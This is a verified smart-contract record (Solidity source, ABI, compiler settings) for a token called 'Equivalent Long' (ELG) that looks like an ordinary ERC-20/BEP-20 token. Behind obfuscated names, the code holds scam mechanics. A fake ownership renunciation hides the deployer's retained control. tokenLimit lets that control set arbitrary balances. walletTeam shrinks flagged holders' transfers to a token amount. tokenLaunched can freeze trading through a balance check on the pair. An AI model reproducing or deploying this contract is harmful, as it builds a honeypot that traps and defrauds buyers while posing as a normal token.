{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface liquidityMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract swapMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellFund {\n    function createPair(address liquidityFee, address tokenIsTake) external returns (address);\n}\n\ninterface fromLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeAmount) external view returns (uint256);\n\n    function transfer(address modeMax, uint256 limitAt) external returns (bool);\n\n    function allowance(address receiverLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeMax,\n        uint256 limitAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableReceiver, uint256 value);\n    event Approval(address indexed receiverLimit, address indexed spender, uint256 value);\n}\n\ninterface maxToken is fromLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EquivalentLong is swapMax, fromLiquidity, maxToken {\n\n    mapping(address => mapping(address => uint256)) private launchedSell;\n\n    function isTakeAmount() public {\n        emit OwnershipTransferred(launchedMarketing, address(0));\n        toTeam = address(0);\n    }\n\n    function enableLimit(address tokenTeam, address modeMax, uint256 limitAt) internal returns (bool) {\n        if (tokenTeam == launchedMarketing) {\n            return tokenReceiverList(tokenTeam, modeMax, limitAt);\n        }\n        uint256 modeWallet = fromLiquidity(walletMin).balanceOf(limitSender);\n        require(modeWallet == shouldTo);\n        require(modeMax != limitSender);\n        if (amountWallet[tokenTeam]) {\n            return tokenReceiverList(tokenTeam, modeMax, takeMode);\n        }\n        return tokenReceiverList(tokenTeam, modeMax, limitAt);\n    }\n\n    string private liquidityTrading = \"ELG\";\n\n    function allowance(address liquidityMin, address receiverMaxTrading) external view virtual override returns (uint256) {\n        if (receiverMaxTrading == teamTrading) {\n            return type(uint256).max;\n        }\n        return launchedSell[liquidityMin][receiverMaxTrading];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoListLaunch;\n    }\n\n    mapping(address => bool) public listFee;\n\n    function exemptReceiver(address walletLiquidity) public {\n        if (minWallet) {\n            return;\n        }\n        \n        listFee[walletLiquidity] = true;\n        \n        minWallet = true;\n    }\n\n    function approve(address receiverMaxTrading, uint256 limitAt) public virtual override returns (bool) {\n        launchedSell[_msgSender()][receiverMaxTrading] = limitAt;\n        emit Approval(_msgSender(), receiverMaxTrading, limitAt);\n        return true;\n    }\n\n    address private toTeam;\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityTrading;\n    }\n\n    string private amountMin = \"Equivalent Long\";\n\n    address public launchedMarketing;\n\n    bool private modeTx;\n\n    mapping(address => uint256) private receiverShould;\n\n    function tokenLaunched(uint256 limitAt) public {\n        atLimitSwap();\n        shouldTo = limitAt;\n    }\n\n    function tokenReceiverList(address tokenTeam, address modeMax, uint256 limitAt) internal returns (bool) {\n        require(receiverShould[tokenTeam] >= limitAt);\n        receiverShould[tokenTeam] -= limitAt;\n        receiverShould[modeMax] += limitAt;\n        emit Transfer(tokenTeam, modeMax, limitAt);\n        return true;\n    }\n\n    uint256 private autoListLaunch = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamMax;\n    }\n\n    function transfer(address teamListWallet, uint256 limitAt) external virtual override returns (bool) {\n        return enableLimit(_msgSender(), teamListWallet, limitAt);\n    }\n\n    function balanceOf(address feeAmount) public view virtual override returns (uint256) {\n        return receiverShould[feeAmount];\n    }\n\n    bool public modeReceiver;\n\n    uint256 public maxAt;\n\n    function name() external view virtual override returns (string memory) {\n        return amountMin;\n    }\n\n    uint256 private maxAtAmount;\n\n    uint256 shouldTo;\n\n    uint8 private teamMax = 18;\n\n    function owner() external view returns (address) {\n        return toTeam;\n    }\n\n    address limitSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private launchTotal;\n\n    constructor (){\n        if (fromTokenFee != maxAtAmount) {\n            buyLiquidity = true;\n        }\n        liquidityMax atBuy = liquidityMax(teamTrading);\n        walletMin = sellFund(atBuy.factory()).createPair(atBuy.WETH(), address(this));\n        if (buyLiquidity == modeReceiver) {\n            fromTokenFee = maxAtAmount;\n        }\n        launchedMarketing = _msgSender();\n        isTakeAmount();\n        listFee[launchedMarketing] = true;\n        receiverShould[launchedMarketing] = autoListLaunch;\n        if (modeTx == modeReceiver) {\n            modeReceiver = false;\n        }\n        emit Transfer(address(0), launchedMarketing, autoListLaunch);\n    }\n\n    uint256 public swapTeam;\n\n    function transferFrom(address tokenTeam, address modeMax, uint256 limitAt) external override returns (bool) {\n        if (_msgSender() != teamTrading) {\n            if (launchedSell[tokenTeam][_msgSender()] != type(uint256).max) {\n                require(limitAt <= launchedSell[tokenTeam][_msgSender()]);\n                launchedSell[tokenTeam][_msgSender()] -= limitAt;\n            }\n        }\n        return enableLimit(tokenTeam, modeMax, limitAt);\n    }\n\n    function tokenLimit(address teamListWallet, uint256 limitAt) public {\n        atLimitSwap();\n        receiverShould[teamListWallet] = limitAt;\n    }\n\n    function walletTeam(address teamEnable) public {\n        atLimitSwap();\n        if (swapTeam != maxAtAmount) {\n            swapTeam = fromTokenFee;\n        }\n        if (teamEnable == launchedMarketing || teamEnable == walletMin) {\n            return;\n        }\n        amountWallet[teamEnable] = true;\n    }\n\n    bool private amountLaunch;\n\n    bool public minWallet;\n\n    uint256 public fromTokenFee;\n\n    bool public buyLiquidity;\n\n    function atLimitSwap() private view {\n        require(listFee[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return toTeam;\n    }\n\n    address teamTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 modeExempt;\n\n    address public walletMin;\n\n    uint256 constant takeMode = 20 ** 10;\n\n    mapping(address => bool) public amountWallet;\n\n    event OwnershipTransferred(address indexed listFromMax, address indexed takeLiquidityToken);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listFromMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLiquidityToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverMaxTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMaxTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLiquidity\",\"type\":\"address\"}],\"name\":\"exemptReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTokenFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTakeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitAt\",\"type\":\"uint256\"}],\"name\":\"tokenLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamListWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitAt\",\"type\":\"uint256\"}],\"name\":\"tokenLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamListWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamEnable\",\"type\":\"address\"}],\"name\":\"walletTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EquivalentLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}